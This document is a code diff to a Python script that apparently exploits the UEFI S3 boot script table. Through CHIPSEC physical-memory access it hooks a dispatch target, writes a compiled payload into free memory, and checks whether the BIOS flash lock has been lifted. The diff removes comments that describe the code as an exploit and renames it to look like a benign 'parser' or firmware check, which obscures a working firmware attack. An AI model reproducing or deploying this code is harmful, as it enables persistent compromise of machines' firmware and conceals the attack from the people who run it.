@@ -238,60 +238,47 @@ class UefiParser(object):
 
             if op == self.EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE:
 
-                # get value information
                 width, count = byte_at(data, 9), qword_at(data, 24)
 
-                # get write adderss
                 addr = qword_at(data, 16)
 
-                # get values list
                 values = self.read_values(data[32:], width, count)
 
                 self.memory_write_proc(width, addr, count, values)
 
             elif op == self.EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE:
 
-                # get value information
                 width, count = byte_at(data, 9), qword_at(data, 24)
 
-                # get write adderss
                 addr = qword_at(data, 16)
 
-                # get PCI device address
                 bus, dev, fun, off = (addr >> 24) & 0xff, (addr >> 16) & 0xff, \
                                      (addr >> 8) & 0xff,  (addr >> 0) & 0xff
 
-                # get values list
                 values = self.read_values(data[32:], width, count)
 
                 self.pci_write(width, bus, dev, fun, off, count, values)
 
             elif op == self.EFI_BOOT_SCRIPT_IO_WRITE_OPCODE:
 
-                # get value information
                 width, count = byte_at(data, 9), qword_at(data, 16)
 
-                # get I/O port number
                 port = word_at(data, 10)
 
-                # get values list
                 values = self.read_values(data[24:], width, count)
 
                 self.io_write_proc(width, port, count, values)
 
             elif op == self.EFI_BOOT_SCRIPT_DISPATCH_OPCODE:
 
-                # get call address
                 addr = qword_at(data, 16)
 
                 self.process_dispatch(addr)
 
             else:
 
-                # skip unknown instruction
                 pass
 
-            # go to the next instruction
             data = data[size:]
             ptr += size
 
@@ -316,32 +303,28 @@ class UefiParser(object):
 
             if op == self.EFI_BOOT_SCRIPT_DISPATCH_OPCODE:
 
-                # get call address
                 addr = qword_at(data, 3)
 
                 self.process_dispatch(addr)
 
             else:
 
-                # skip unknown instruction
                 pass
 
-            # go to the next instruction
             data = data[size:]
             ptr += size
             num += 1
 
     def parse(self, data, boot_script_addr):
 
-        # check for AAh signature
         if data[0] == self.BOOT_SCRIPT_EDK_SIGN:
 
-            # parse EDK format of boot script table
+            # parse EDK formati
             self.parse_edk(data[1 + self.BOOT_SCRIPT_EDK_HEADER_LEN:], boot_script_addr)
 
         else:
 
-            # parse Intel format (DQ77KB, Q77 chipset) of boot script table
+            # parse Intel formati
             self.parse_intel(data, boot_script_addr)
 
 
@@ -353,7 +336,7 @@ class Uefi_Parser_Table(object):
     JUMP_32_LEN = 5
     JUMP_64_LEN = 14
 
-    WAKE_AFTER = 10 # in seconds
+    WAKE_AFTER = 10 # saniye
 
     BOOT_SCRIPT_OFFSET = 0x18
     BOOT_SCRIPT_MAX_LEN = 0x8000
@@ -368,7 +351,6 @@ class Uefi_Parser_Table(object):
         
         def process_dispatch(self, addr):
 
-            # pass dispatch instruction operand to the caller
             raise self.AddressFound(addr)
 
         def parse(self, data, boot_script_addr):
@@ -382,7 +364,6 @@ class Uefi_Parser_Table(object):
 
                 return e.addr
 
-            # boot script doesn't have any dispatch instructions
             return None
 
     def _efi_var_read(self, name, guid):
@@ -399,13 +380,12 @@ class Uefi_Parser_Table(object):
 
     def _mem_read(self, addr, size):
 
-        # align memory reads by 1000h
+        # memory reads by 1000h
         read_addr = addr & 0xfffffffffffff000
         read_size = size + addr - read_addr
 
         if hasattr(self._memory, 'read_phys_mem'):
 
-            # for CHIPSEC >= 1.1.7
             data = self._memory.read_phys_mem(read_addr, read_size)
 
         elif hasattr(self._memory, 'read_physical_mem'):
@@ -423,12 +403,10 @@ class Uefi_Parser_Table(object):
 
         if hasattr(self._memory, 'write_phys_mem'):
 
-            # for CHIPSEC >= 1.1.7
             self._memory.write_phys_mem(addr, len(data), data)
 
         elif hasattr(self._memory, 'write_physical_mem'):
 
-            # for older versions
             self._memory.write_physical_mem(addr, len(data), data)
 
         else: 
@@ -473,7 +451,6 @@ class Uefi_Parser_Table(object):
 
         while max_size < 1024 * 1024:
 
-            # search for zero bytes at the end of the code page
             if self._mem_read(addr - size, size) == '\0' * size:
 
                 addr -= size
@@ -489,17 +466,14 @@ class Uefi_Parser_Table(object):
         hook_size = 0
         data = self._mem_read(addr, 0x40)
         
-        # disassembly instructions and determinate patch length
         while hook_size < self.JUMP_32_LEN:
 
             size = self._disasm(data[hook_size:])
             hook_size += size
         
 
-        # backup original code of the function
         data = data[:hook_size]
 
-        # find zero memory for patch
         buff_size = len(payload) + hook_size + self.JUMP_32_LEN
         buff_addr = self._find_zero_bytes(addr, buff_size)
 
@@ -544,7 +518,7 @@ class Uefi_Parser_Table(object):
             raise Exception('Unable to locate EFI_BOOT_SCRIPT_DISPATCH_OPCODE')
 
 
-        # compile exploitation payload
+        # compile payload
         payload = Asm().compile(PAYLOAD)
 
         # find offset of payload data area
@@ -576,10 +550,8 @@ class Uefi_Parser_Table(object):
             self._mem_write(buff_addr, '\0' * buff_size)
 
 
-            # bios lock enable bit of BIOS_CNTL
             BLE = 1
-
-            # check if access to flash is locked
+			#last check
             if bitval(BIOS_CNTL, BLE) == 0:
                 success = True
             
@@ -688,7 +660,6 @@ def main ():
 
 
         if(os.path.exists("/sys/firmware/efi")):
-		   print ('Your BIOS is vulnurable...Performing firmware check')	
            Uefi_Parser_Table()
 
         else:
